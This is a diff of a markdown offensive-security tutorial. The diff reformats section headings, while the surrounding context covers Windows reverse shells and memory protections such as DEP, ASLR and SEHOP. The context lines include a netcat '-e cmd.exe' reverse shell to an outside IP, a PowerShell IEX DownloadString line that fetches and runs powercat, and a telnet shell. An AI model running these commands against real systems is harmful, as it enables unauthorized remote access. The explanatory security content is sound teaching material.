@@ -175,7 +175,7 @@ Bind Shell (The other kind):
 
 For this section, we assume you can obtain a shell / command prompt equivalent connection from your system to the Windows remote system. This can be potentially achieved using the Meterpreter tool as outlined [here](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/).
 
-<u>A possible method</u><br><br>
+#### 6.1 A Possible Method
 We first need to upload the [Windows netcat](https://eternallybored.org/misc/netcat/).
 ```
 upload /path/to/nc.exe C:\Windows\System32
@@ -204,7 +204,7 @@ Finally, we can execute netcat on Windows which gives us a command prompt (Suppo
 nc 123.45.67.89 9191 -e cmd.exe
 ```
 
-<u>Powershell</u><br><br>
+#### 6.2 Powershell
 If you prefer alternatives, you can use [powercat](https://github.com/besimorhino/powercat), which is essentially a Powershell version of netcat. To install it in Windows:
 ```powershell
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
@@ -216,7 +216,7 @@ powershell -c 123.45.67.89 -p 9191 -ep
 ```
 Note: use `-ep` for powershell, `-e cmd` for command prompt
 
-<u>Telnet</u><br><br>
+#### 6.3 Telnet
 
 Under very obscure situations, you may consider trying telnet despite the need for administrator privileges. To enable it on newer systems (e.g. Windows 10):
 ```bat
@@ -237,7 +237,7 @@ telnet 123.45.67.89 9191
 ### 7. Windows Protection Mechanisms
 Due to how common buffer overflow attacks might come to one's mind, Microsoft has built in some mitatigation techniques into Windows that help protect memory manipulation by adversaries.
 
-<u>Data Execution Prevention (DEP)</u><br><br>
+#### 7.1 Data Execution Prevention (DEP)
 Typically, an attacker might attempt to store malicious code in an area of memory not intended for it. Attackers then subsequently modify the eip of a program vulnerable to buffer overflow to point to the malicious code:
 ```
 		  Some  Memory         Program Execution Stack
@@ -251,7 +251,7 @@ Typically, an attacker might attempt to store malicious code in an area of memor
 ```
 DEP simply marks these regions of memory as non-executable. Therefore, even if `BAD CODE` exists, it cannot be executed, nullifying the damage caused by a buffer overflow.
 
-<u>Address Space Layout Randomization (ASLR)</u><br><br>
+#### 7.2 Address Space Layout Randomization (ASLR)
 Traditionally, core processes are assigned to predictable memory regions upon system startup. This implies that an attacker can targe specific core processes as and when they are vulnerable.
 
 ```
@@ -268,7 +268,7 @@ In the above example, we could hypothetically modify bytes located from 0x123456
 
 However, ASLR will just randomize all these memory locations, making it difficult for an attacker to guess the location of a given targeted process. Therefore, arbitrary code execution becomes less reliable for an adversary.
 
-<u>Structured Exception Handler Overwrite Protection (SEHOP)</u><br><br>
+#### 7.3 Structured Exception Handler Overwrite Protection (SEHOP)
 Exceptions are anomalous conditions requiring special processing that disrupts program flow execution. In Windows, a dispatcher is responsible for exceptions, and stores them in a linked list of exception registration records:
 
 ```c++
